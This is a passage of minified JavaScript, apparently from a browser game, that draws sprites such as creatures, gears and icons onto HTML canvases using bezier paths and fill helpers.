                    r.bezierCurveTo(93.99996948242188 * e, 85.85067749023438 * e, 111.99996948242188 * e, 83.85067749023438 * e, 124.99996948242188 * e, 70.85067749023438 * e),
                    r.bezierCurveTo(129.99996948242188 * e, 67.85067749023438 * e, 145.99996948242188 * e, 65.85067749023438 * e, 159.99996948242188 * e, 67.85067749023438 * e),
                    r.bezierCurveTo(159.99996948242188 * e, 71.85067749023438 * e, 159.99996948242188 * e, 71.85067749023438 * e, 159.99996948242188 * e, 75.85067749023438 * e),
                    r.bezierCurveTo(146.99996948242188 * e, 72.85067749023438 * e, 144.99996948242188 * e, 75.85067749023438 * e, 143.99996948242188 * e, 82.85067749023438 * e),
                    r.bezierCurveTo(144.99996948242188 * e, 86.85067749023438 * e, 140.99996948242188 * e, 90.85067749023438 * e, 137.99996948242188 * e, 86.85067749023438 * e),
                    r.bezierCurveTo(139.99996948242188 * e, 72.85067749023438 * e, 135.99996948242188 * e, 72.85067749023438 * e, 133.99996948242188 * e, 82.85067749023438 * e),
                    r.bezierCurveTo(127.99996948242188 * e, 88.85067749023438 * e, 124.99996948242188 * e, 70.85067749023438 * e, 116.99996948242188 * e, 86.85067749023438 * e),
                    r.bezierCurveTo(110.99996948242188 * e, 91.85067749023438 * e, 96.99996948242188 * e, 81.85067749023438 * e, 89.99996948242188 * e, 90.85067749023438 * e),
                    r.bezierCurveTo(85.99996948242188 * e, 92.85067749023438 * e, 81.99996948242188 * e, 95.85067749023438 * e, 76.99996948242188 * e, 86.85067749023438 * e),
                    r.bezierCurveTo(67.99996948242188 * e, 93.85067749023438 * e, 67.99996948242188 * e, 91.85067749023438 * e, 60.999969482421875 * e, 79.85067749023438 * e),
                    r.bezierCurveTo(53.999969482421875 * e, 71.85067749023438 * e, 52.999969482421875 * e, 72.85067749023438 * e, 46.999969482421875 * e, 77.85067749023438 * e),
                    r.bezierCurveTo(41.999969482421875 * e, 78.85067749023438 * e, 42.999969482421875 * e, 69.85067749023438 * e, 33.999969482421875 * e, 65.85067749023438 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    ke(r, 68 * e, 111.29513549804688 * e, 15 * e),
                    he(r, i[7], i[8], 4 * e),
                    ke(r, 123 * e, 111.29510498046875 * e, 15 * e),
                    he(r, i[7], i[8], 4 * e),
                    ke(r, 63 * e, 106 * e, 5 * e),
                    he(r, i[9]),
                    ke(r, 118 * e, 106 * e, 5 * e),
                    he(r, i[9]),
                    n
            }
            function u1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 191 * e,
                    n.height = 153 * e,
                    r.globalAlpha = .5,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(96.49996948242188 * e, 66.79510498046875 * e),
                    r.rotate(0),
                    Ve(r, -79.5 * e, -48.5 * e, 159 * e, 97 * e, 22 * e),
                    r.restore(),
                    he(r, i[0], i[0], 4 * e),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(96.49996948242188 * e, 66.79510498046875 * e),
                    r.rotate(0),
                    Ve(r, -79.5 * e, -48.5 * e, 159 * e, 97 * e, 22 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.translate(2 * e, 0),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(119 * e, 28 * e),
                    r.bezierCurveTo(119 * e, 22 * e, 119 * e, 20 * e, 122 * e, 16 * e),
                    r.bezierCurveTo(149 * e, 39 * e, 149 * e, 39 * e, 176 * e, 63 * e),
                    r.bezierCurveTo(176 * e, 75 * e, 176 * e, 75 * e, 175 * e, 88 * e),
                    r.bezierCurveTo(174 * e, 90 * e, 174 * e, 90 * e, 172 * e, 93 * e),
                    r.bezierCurveTo(171 * e, 101 * e, 169 * e, 109 * e, 164 * e, 113 * e),
                    r.bezierCurveTo(163 * e, 104 * e, 163 * e, 104 * e, 162 * e, 95 * e),
                    r.bezierCurveTo(155 * e, 105 * e, 155 * e, 105 * e, 147 * e, 116 * e),
                    r.bezierCurveTo(87 * e, 114 * e, 87 * e, 114 * e, 26 * e, 112 * e),
                    r.bezierCurveTo(27 * e, 106 * e, 27 * e, 106 * e, 27 * e, 101 * e),
                    r.bezierCurveTo(24 * e, 104 * e, 24 * e, 104 * e, 20 * e, 108 * e),
                    r.bezierCurveTo(17 * e, 103 * e, 20 * e, 86 * e, 23 * e, 72 * e),
                    r.bezierCurveTo(15 * e, 74 * e, 14 * e, 78 * e, 12 * e, 83 * e),
                    r.bezierCurveTo(12 * e, 65 * e, 12 * e, 54 * e, 16 * e, 42 * e),
                    r.bezierCurveTo(14 * e, 39 * e, 14 * e, 39 * e, 12 * e, 36 * e),
                    r.bezierCurveTo(16 * e, 33 * e, 16 * e, 33 * e, 19 * e, 30 * e),
                    r.bezierCurveTo(18 * e, 27 * e, 18 * e, 27 * e, 17 * e, 25 * e),
                    r.bezierCurveTo(24 * e, 24 * e, 31 * e, 21 * e, 29 * e, 19 * e),
                    r.bezierCurveTo(37 * e, 25 * e, 37 * e, 25 * e, 45 * e, 31 * e),
                    r.bezierCurveTo(40 * e, 23 * e, 40 * e, 21 * e, 42 * e, 16 * e),
                    r.bezierCurveTo(74 * e, 16 * e, 74 * e, 16 * e, 106 * e, 16 * e),
                    r.bezierCurveTo(113 * e, 21 * e, 113 * e, 21 * e, 119 * e, 26 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    n
            }
            function d1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 191 * e,
                    i.height = 153 * e,
                    n.save(),
                    n.translate(96.49996948242188 * e, 66.79510498046875 * e),
                    Ve(n, -79.5 * e, -48.5 * e, 159 * e, 97 * e, 22 * e),
                    n.restore(),
                    he(n, t[0], t[0], 4 * e),
                    n.translate(2 * e, 0),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(119 * e, 28 * e),
                    n.bezierCurveTo(119 * e, 22 * e, 119 * e, 20 * e, 122 * e, 16 * e),
                    n.bezierCurveTo(149 * e, 39 * e, 149 * e, 39 * e, 176 * e, 63 * e),
                    n.bezierCurveTo(176 * e, 75 * e, 176 * e, 75 * e, 175 * e, 88 * e),
                    n.bezierCurveTo(174 * e, 90 * e, 174 * e, 90 * e, 172 * e, 93 * e),
                    n.bezierCurveTo(171 * e, 101 * e, 169 * e, 109 * e, 164 * e, 113 * e),
                    n.bezierCurveTo(163 * e, 104 * e, 163 * e, 104 * e, 162 * e, 95 * e),
                    n.bezierCurveTo(155 * e, 105 * e, 155 * e, 105 * e, 147 * e, 116 * e),
                    n.bezierCurveTo(87 * e, 114 * e, 87 * e, 114 * e, 26 * e, 112 * e),
                    n.bezierCurveTo(27 * e, 106 * e, 27 * e, 106 * e, 27 * e, 101 * e),
                    n.bezierCurveTo(24 * e, 104 * e, 24 * e, 104 * e, 20 * e, 108 * e),
                    n.bezierCurveTo(17 * e, 103 * e, 20 * e, 86 * e, 23 * e, 72 * e),
                    n.bezierCurveTo(15 * e, 74 * e, 14 * e, 78 * e, 12 * e, 83 * e),
                    n.bezierCurveTo(12 * e, 65 * e, 12 * e, 54 * e, 16 * e, 42 * e),
                    n.bezierCurveTo(14 * e, 39 * e, 14 * e, 39 * e, 12 * e, 36 * e),
                    n.bezierCurveTo(16 * e, 33 * e, 16 * e, 33 * e, 19 * e, 30 * e),
                    n.bezierCurveTo(18 * e, 27 * e, 18 * e, 27 * e, 17 * e, 25 * e),
                    n.bezierCurveTo(24 * e, 24 * e, 31 * e, 21 * e, 29 * e, 19 * e),
                    n.bezierCurveTo(37 * e, 25 * e, 37 * e, 25 * e, 45 * e, 31 * e),
                    n.bezierCurveTo(40 * e, 23 * e, 40 * e, 21 * e, 42 * e, 16 * e),
                    n.bezierCurveTo(74 * e, 16 * e, 74 * e, 16 * e, 106 * e, 16 * e),
                    n.bezierCurveTo(113 * e, 21 * e, 113 * e, 21 * e, 119 * e, 26 * e),
                    n.closePath(),
                    he(n, t[0], t[0], 4 * e),
                    n.save(),
                    n.translate(97.49996948242188 * e, 95.12844848632812 * e),
                    Ve(n, -62.5 * e, -41.5 * e, 125 * e, 83 * e, 20 * e),
                    n.restore(),
                    he(n, t[0], t[0], 4 * e),
                    i
            }
            function T1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 40 * e
                    , a = 40 * e
                    , o = e * (n.width = o) / 2
                    , a = e * (n.height = a) / 2
                    , s = 15 * e;
                return r.save(),
                    r.translate(o, a),
                    r.globalAlpha = 1,
                    ke(r, 0, 0, s),
                    he(r, i[0]),
                    s = 5 * e,
                    r.translate(2 * e, +e),
                    r.globalAlpha = 1,
                    ke(r, 0, 0, s),
                    he(r, i[1]),
                    r.restore(),
                    n
            }
            function A1(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d");
                return r.width = 185 * e,
                    r.height = 240 * e,
                    o.globalAlpha = .5,
                    o.translate(0, 10 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(44 * e, 137 * e),
                    o.bezierCurveTo(60 * e, 87 * e, 68 * e, 66 * e, 92 * e, 67 * e),
                    o.bezierCurveTo(115 * e, 64 * e, 129 * e, 97 * e, 137 * e, 136 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(53 * e, 181 * e),
                    o.bezierCurveTo(30 * e, 164 * e, 19 * e, 150 * e, 11 * e, 136 * e),
                    o.bezierCurveTo(28 * e, 121 * e, 38 * e, 132 * e, 48 * e, 150 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(63 * e, 208 * e),
                    o.bezierCurveTo(75 * e, 224 * e, 86 * e, 228 * e, 93 * e, 228 * e),
                    o.bezierCurveTo(104 * e, 229 * e, 116 * e, 219 * e, 122 * e, 205 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(130 * e, 170 * e),
                    o.bezierCurveTo(146 * e, 125 * e, 156 * e, 126 * e, 173 * e, 137 * e),
                    o.bezierCurveTo(167 * e, 151 * e, 143 * e, 174 * e, 131 * e, 183 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(39 * e, 140 * e),
                    o.bezierCurveTo(75 * e, 126 * e, 113 * e, 127 * e, 143 * e, 137 * e),
                    o.bezierCurveTo(141 * e, 186 * e, 130 * e, 202 * e, 113 * e, 214 * e),
                    o.bezierCurveTo(85 * e, 228 * e, 56 * e, 219 * e, 48 * e, 173 * e),
                    o.bezierCurveTo(40 * e, 148 * e, 43 * e, 145 * e, 39 * e, 140 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.globalAlpha = 1,
                    o.translate(0, -10 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(44 * e, 137 * e),
                    o.bezierCurveTo(60 * e, 87 * e, 68 * e, 66 * e, 92 * e, 67 * e),
                    o.bezierCurveTo(115 * e, 64 * e, 129 * e, 97 * e, 137 * e, 136 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(53 * e, 181 * e),
                    o.bezierCurveTo(30 * e, 164 * e, 19 * e, 150 * e, 11 * e, 136 * e),
                    o.bezierCurveTo(28 * e, 121 * e, 38 * e, 132 * e, 48 * e, 150 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(63 * e, 208 * e),
                    o.bezierCurveTo(75 * e, 224 * e, 86 * e, 228 * e, 93 * e, 228 * e),
                    o.bezierCurveTo(104 * e, 229 * e, 116 * e, 219 * e, 122 * e, 205 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(130 * e, 170 * e),
                    o.bezierCurveTo(146 * e, 125 * e, 156 * e, 126 * e, 173 * e, 137 * e),
                    o.bezierCurveTo(167 * e, 151 * e, 143 * e, 174 * e, 131 * e, 183 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(39 * e, 140 * e),
                    o.bezierCurveTo(75 * e, 126 * e, 113 * e, 127 * e, 143 * e, 137 * e),
                    o.bezierCurveTo(141 * e, 186 * e, 130 * e, 202 * e, 113 * e, 214 * e),
                    o.bezierCurveTo(85 * e, 228 * e, 56 * e, 219 * e, 48 * e, 173 * e),
                    o.bezierCurveTo(40 * e, 148 * e, 43 * e, 145 * e, 39 * e, 140 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(59 * e, 99 * e),
                    o.bezierCurveTo(71 * e, 68 * e, 81 * e, 68 * e, 94 * e, 67 * e),
                    o.bezierCurveTo(105 * e, 66 * e, 119 * e, 75 * e, 123 * e, 96 * e),
                    o.bezierCurveTo(104 * e, 91 * e, 101 * e, 94 * e, 94 * e, 97 * e),
                    o.bezierCurveTo(76 * e, 92 * e, 73 * e, 93 * e, 60 * e, 99 * e),
                    o.closePath(),
                    he(o, i[3], i[2], 4 * e),
                    0 === n ? (o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(47 * e, 149 * e),
                        o.bezierCurveTo(43 * e, 140 * e, 48 * e, 130 * e, 59 * e, 127 * e),
                        o.bezierCurveTo(77 * e, 126 * e, 90 * e, 131 * e, 131 * e, 127 * e),
                        o.bezierCurveTo(143 * e, 130 * e, 144 * e, 143 * e, 132 * e, 154 * e),
                        o.bezierCurveTo(90 * e, 152 * e, 90 * e, 152 * e, 48 * e, 150 * e),
                        o.closePath(),
                        he(o, i[1]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(40 * e, 139 * e),
                        o.bezierCurveTo(48 * e, 113 * e, 76 * e, 119 * e, 91 * e, 126 * e),
                        o.bezierCurveTo(117 * e, 113 * e, 135 * e, 117 * e, 144 * e, 134 * e),
                        o.bezierCurveTo(144 * e, 138 * e, 144 * e, 138 * e, 144 * e, 142 * e),
                        o.bezierCurveTo(128 * e, 124 * e, 108 * e, 124 * e, 91 * e, 136 * e),
                        o.bezierCurveTo(59 * e, 124 * e, 50 * e, 137 * e, 42 * e, 148 * e)) : (o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(41 * e, 139 * e),
                            o.bezierCurveTo(53 * e, 117 * e, 69 * e, 118 * e, 92 * e, 127 * e),
                            o.bezierCurveTo(124 * e, 111 * e, 136 * e, 121 * e, 143 * e, 136 * e),
                            o.bezierCurveTo(142 * e, 144 * e, 142 * e, 144 * e, 141 * e, 152 * e),
                            o.bezierCurveTo(128 * e, 131 * e, 113 * e, 138 * e, 92 * e, 145 * e),
                            o.bezierCurveTo(57 * e, 133 * e, 57 * e, 147 * e, 44 * e, 154 * e)),
                    o.closePath(),
                    he(o, i[3], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(90 * e, 95 * e),
                    o.bezierCurveTo(99 * e, 82 * e, 98 * e, 58 * e, 99 * e, 40 * e),
                    o.bezierCurveTo(90 * e, 38 * e, 89 * e, 34 * e, 92 * e, 17 * e),
                    o.bezierCurveTo(92 * e, 5 * e, 83 * e, 16 * e, 78 * e, 29 * e),
                    o.bezierCurveTo(72 * e, 59 * e, 87 * e, 81 * e, 89 * e, 87 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(90 * e, 86 * e),
                    o.bezierCurveTo(95 * e, 74 * e, 95 * e, 62 * e, 95 * e, 43 * e),
                    o.bezierCurveTo(84 * e, 37 * e, 86 * e, 34 * e, 89 * e, 16 * e),
                    o.bezierCurveTo(75 * e, 29 * e, 80 * e, 58 * e, 90 * e, 85 * e),
                    o.closePath(),
                    he(o, i[1], i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(92 * e, 117 * e),
                    o.bezierCurveTo(98 * e, 87 * e, 93 * e, 78 * e, 85 * e, 76 * e),
                    o.bezierCurveTo(85.5 * e, 79.5 * e, 85.5 * e, 79.5 * e, 86 * e, 83 * e),
                    o.bezierCurveTo(84 * e, 85.5 * e, 84 * e, 85.5 * e, 82 * e, 88 * e),
                    o.bezierCurveTo(90 * e, 93 * e, 89 * e, 100 * e, 92 * e, 117 * e),
                    o.closePath(),
                    he(o, i[1], i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(92 * e, 175 * e),
                    o.bezierCurveTo(95 * e, 135 * e, 98 * e, 125 * e, 109 * e, 121 * e),
                    o.bezierCurveTo(106 * e, 114 * e, 104 * e, 114 * e, 102 * e, 113 * e),
                    o.bezierCurveTo(103 * e, 106 * e, 104 * e, 103 * e, 107 * e, 96 * e),
                    o.bezierCurveTo(74 * e, 108 * e, 86 * e, 157 * e, 92 * e, 174 * e),
                    o.closePath(),
                    he(o, i[1], i[3], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(48 * e, 169 * e),
                    o.bezierCurveTo(42 * e, 187 * e, 50 * e, 193 * e, 59 * e, 198 * e),
                    o.closePath(),
                    he(o, void 0, i[2], 5 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(136 * e, 171 * e),
                    o.bezierCurveTo(139 * e, 186 * e, 138 * e, 191 * e, 124 * e, 199 * e),
                    o.closePath(),
                    he(o, void 0, i[2], 4 * e),
                    ke(o, 63 * e, 180 * e, 15.231546211727817 * e),
                    he(o, i[4]),
                    ke(o, 121 * e, 181 * e, 15.652475842498529 * e),
                    he(o, i[4]),
                    ke(o, 58 * e, 175 * e, 5.656854249492381 * e),
                    he(o, i[2]),
                    ke(o, 116 * e, 175 * e, 5.656854249492381 * e),
                    he(o, i[2]),
                    r
            }
            function h1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 185 * e,
                    i.height = 240 * e,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(44 * e, 137 * e),
                    n.bezierCurveTo(60 * e, 87 * e, 68 * e, 66 * e, 92 * e, 67 * e),
                    n.bezierCurveTo(115 * e, 64 * e, 129 * e, 97 * e, 137 * e, 136 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(53 * e, 181 * e),
                    n.bezierCurveTo(30 * e, 164 * e, 19 * e, 150 * e, 11 * e, 136 * e),
                    n.bezierCurveTo(28 * e, 121 * e, 38 * e, 132 * e, 48 * e, 150 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(63 * e, 208 * e),
                    n.bezierCurveTo(75 * e, 224 * e, 86 * e, 228 * e, 93 * e, 228 * e),
                    n.bezierCurveTo(104 * e, 229 * e, 116 * e, 219 * e, 122 * e, 205 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(130 * e, 170 * e),
                    n.bezierCurveTo(146 * e, 125 * e, 156 * e, 126 * e, 173 * e, 137 * e),
                    n.bezierCurveTo(167 * e, 151 * e, 143 * e, 174 * e, 131 * e, 183 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(39 * e, 140 * e),
                    n.bezierCurveTo(75 * e, 126 * e, 113 * e, 127 * e, 143 * e, 137 * e),
                    n.bezierCurveTo(141 * e, 186 * e, 130 * e, 202 * e, 113 * e, 214 * e),
                    n.bezierCurveTo(85 * e, 228 * e, 56 * e, 219 * e, 48 * e, 173 * e),
                    n.bezierCurveTo(40 * e, 148 * e, 43 * e, 145 * e, 39 * e, 140 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(90 * e, 95 * e),
                    n.bezierCurveTo(99 * e, 82 * e, 98 * e, 58 * e, 99 * e, 40 * e),
                    n.bezierCurveTo(90 * e, 38 * e, 89 * e, 34 * e, 92 * e, 17 * e),
                    n.bezierCurveTo(92 * e, 5 * e, 83 * e, 16 * e, 78 * e, 29 * e),
                    n.bezierCurveTo(72 * e, 59 * e, 87 * e, 81 * e, 89 * e, 87 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(90 * e, 86 * e),
                    n.bezierCurveTo(95 * e, 74 * e, 95 * e, 62 * e, 95 * e, 43 * e),
                    n.bezierCurveTo(84 * e, 37 * e, 86 * e, 34 * e, 89 * e, 16 * e),
                    n.bezierCurveTo(75 * e, 29 * e, 80 * e, 58 * e, 90 * e, 85 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(92 * e, 117 * e),
                    n.bezierCurveTo(98 * e, 87 * e, 93 * e, 78 * e, 85 * e, 76 * e),
                    n.bezierCurveTo(85.5 * e, 79.5 * e, 85.5 * e, 79.5 * e, 86 * e, 83 * e),
                    n.bezierCurveTo(84 * e, 85.5 * e, 84 * e, 85.5 * e, 82 * e, 88 * e),
                    n.bezierCurveTo(90 * e, 93 * e, 89 * e, 100 * e, 92 * e, 117 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(92 * e, 175 * e),
                    n.bezierCurveTo(95 * e, 135 * e, 98 * e, 125 * e, 109 * e, 121 * e),
                    n.bezierCurveTo(106 * e, 114 * e, 104 * e, 114 * e, 102 * e, 113 * e),
                    n.bezierCurveTo(103 * e, 106 * e, 104 * e, 103 * e, 107 * e, 96 * e),
                    n.bezierCurveTo(74 * e, 108 * e, 86 * e, 157 * e, 92 * e, 174 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function l1(e) {
                var t = document.createElement("canvas")
                    , i = t.getContext("2d")
                    , n = 200 * e
                    , e = (t.width = 200 * e,
                        t.height = n,
                        ct(.35, !1, ["#0e3022", "#0b8052", "#077b49"]));
                return i.drawImage(e, 10, 10),
                    e = Ot(.9, 0, ["#3d2a6e", "#8255b5"]),
                    i.drawImage(e, 21, 20),
                    e = Ot(.9, 0, ["#3d2a6e", "#8255b5"]),
                    i.drawImage(e, 38, 28),
                    e = Ot(.9, 0, ["#3d2a6e", "#8255b5"]),
                    i.drawImage(e, 15, 37),
                    e = Ot(.9, 0, ["#3d2a6e", "#8255b5"]),
                    i.drawImage(e, 32, 45),
                    t
            }
            function I1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 100 * e
                    , o = 100 * e
                    , a = r / 2
                    , s = o / 2
                    , _ = (i.width = r,
                        i.height = o,
                        5 * e)
                    , E = 28 * e
                    , u = _ / 2
                    , d = E / 2;
                n.translate(a, s);
                for (var T = 0; T < 4; T++)
                    Ve(n, -u, -d, _, E, 2 * e),
                        n.rotate(Math.PI / 4),
                        he(n, t);
                return n.arc(0, 0, 10 * e, 0, 2 * Math.PI),
                    he(n, t),
                    n.globalCompositeOperation = "destination-out",
                    ke(n, 0, 0, 4 * e),
                    n.fill(),
                    i
            }
            function c1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 32 * e
                    , a = 32 * e
                    , s = o / 2
                    , _ = a / 2
                    , E = (n.width = o,
                        n.height = a,
                        5 * e)
                    , u = 28 * e
                    , d = E / 2
                    , T = u / 2;
                if (r.translate(0 * e, 0 * e),
                    r.translate(s, _),
                    1 == i) {
                    ke(r, 0, 0, 10 * e),
                        he(r, t[2], t[2], 3 * e);
                    for (var A = 0; A < 4; A++)
                        Ve(r, -d, -T, E, u, 2 * e),
                            r.rotate(Math.PI / 4),
                            he(r, t[2], t[2], 4 * e)
                }
                for (ke(r, 0, 0, 10 * e),
                    he(r, t[0], t[1], 1.5 * e),
                    A = 0; A < 4; A++)
                    Ve(r, -d, -T, E, u, 2 * e),
                        r.rotate(Math.PI / 4),
                        he(r, t[0], t[1], 1.5 * e);
                return ke(r, 0, 0, 10 * e),
                    he(r, t[0]),
                    ke(r, 0, 0, 4 * e),
                    he(r, t[2], t[1], 1.5 * e),
                    r.globalCompositeOperation = "destination-out",
                    ke(r, 0, 0, 4 * e),
                    he(r, t[0], t[1], 2 * e),
                    r.globalCompositeOperation = "source-over",
                    ke(r, 0, 0, 4 * e),
                    he(r, void 0, t[1], 2 * e),
                    n
            }
            function O1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = (h = 125 * e) / 2
                    , a = (l = 95 * e) / 2
                    , s = 10 * e
                    , _ = 8 * e
                    , E = 112 * e
                    , u = 82 * e
                    , d = E / 2
                    , T = u / 2
                    , A = 4 * e
                    , h = (n.width = h,
                        n.height = l,
                        r.translate(o - 4 * e, a + 4 * e),
                        r.globalAlpha = t ? .5 : 1,
                        Ve(r, -d, -T, E, u, s),
                        he(r, i[0]),
                        r.globalAlpha = 1,
                        r.translate(0, -_),
                        Ve(r, -d, -T, E, u, s),
                        he(r, i[1], i[2], A),
                        55 * e)
                    , l = 45 * e
                    , o = (r.translate(-40 * e, -30 * e),
                        Ve(r, 0, 0, h, l, 5),
                        he(r, i[3]),
                        I1(.7 * e, i[3]));
                return r.drawImage(o, 45 * e, -25 * e),
                    o = I1(.7 * e, i[3]),
                    r.drawImage(o, 45 * e, 15 * e),
                    o = I1(1.2 * e, i[3]),
                    r.drawImage(o, 28 * e, -30 * e),
                    h = 15 * e,
                    l = 70 * e,
                    s = 5 * e,
                    r.translate(78 * e, -5 * e),
                    Ve(r, 0, 0, h, l, s),
                    he(r, i[4]),
                    h = 9 * e,
                    l = 50 * e,
                    s = 3 * e,
                    r.translate(-20 * e, 20 * e),
                    r.rotate(Math.PI / 5),
                    r.globalAlpha = .6,
                    Ve(r, 0, 0, h, l, s),
                    he(r, i[5]),
                    r.translate(-20 * e, 29 * e),
                    r.rotate(Math.PI / 5),
                    r.globalAlpha = .6,
                    r.beginPath(),
                    r.lineJoin = "round",
                    r.moveTo(0, 0),
                    r.lineTo(0, 30 * e),
                    r.lineTo(30 * e, 30 * e),
                    r.closePath(),
                    he(r, null, i[5], 8 * e),
                    n
            }
            function g1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 115 * e
                    , o = 6 * e
                    , r = (i.width = 85 * e,
                        i.height = r,
                        n.translate(-130 * e, -60 * e + o),
                        n.globalAlpha = .5,
                        n.beginPath(),
                        n.bezierCurveTo(190 * e, 87 * e, 201 * e, 59 * e, 208 * e, 64 * e),
                        n.bezierCurveTo(213 * e, 68 * e, 204 * e, 93 * e, 195 * e, 109 * e),
                        n.bezierCurveTo(195 * e, 109 * e, 202 * e, 124 * e, 191 * e, 141 * e),
                        n.bezierCurveTo(182 * e, 151 * e, 164 * e, 155 * e, 148 * e, 144 * e),
                        n.bezierCurveTo(136 * e, 135 * e, 138 * e, 111 * e, 145 * e, 104 * e),
                        n.bezierCurveTo(140 * e, 92 * e, 131 * e, 67 * e, 138 * e, 63 * e),
                        n.bezierCurveTo(145 * e, 61 * e, 153 * e, 82 * e, 155 * e, 96 * e),
                        n.bezierCurveTo(167 * e, 91 * e, 178 * e, 92 * e, 187 * e, 98 * e),
                        n.closePath(),
                        he(n, t[0]),
                        n.translate(0, -o),
                        n.globalAlpha = 1,
                        n.beginPath(),
                        n.bezierCurveTo(190 * e, 87 * e, 201 * e, 59 * e, 208 * e, 64 * e),
                        n.bezierCurveTo(213 * e, 68 * e, 204 * e, 93 * e, 195 * e, 109 * e),
                        n.bezierCurveTo(195 * e, 109 * e, 202 * e, 124 * e, 191 * e, 141 * e),
                        n.bezierCurveTo(182 * e, 151 * e, 164 * e, 155 * e, 148 * e, 144 * e),
                        n.bezierCurveTo(136 * e, 135 * e, 138 * e, 111 * e, 145 * e, 104 * e),
                        n.bezierCurveTo(140 * e, 92 * e, 131 * e, 67 * e, 138 * e, 63 * e),
                        n.bezierCurveTo(145 * e, 61 * e, 153 * e, 82 * e, 155 * e, 96 * e),
                        n.bezierCurveTo(167 * e, 91 * e, 178 * e, 92 * e, 187 * e, 98 * e),
                        n.closePath(),
                        he(n, t[1], t[2], 4),
                        155 * e)
                    , o = 133 * e
                    , a = 10 * e
                    , s = 3 * e
                    , _ = r + -3 * e
                    , E = o + -5 * e;
                return n.save(),
                    n.translate(r, o),
                    n.globalAlpha = 1,
                    ke(n, 0, 0, a),
                    he(n, t[3]),
                    n.restore(),
                    n.save(),
                    n.translate(_, E),
                    n.globalAlpha = 1,
                    ke(n, 0, 0, s),
                    he(n, t[4]),
                    n.restore(),
                    n.save(),
                    n.translate(r + 27 * e, o),
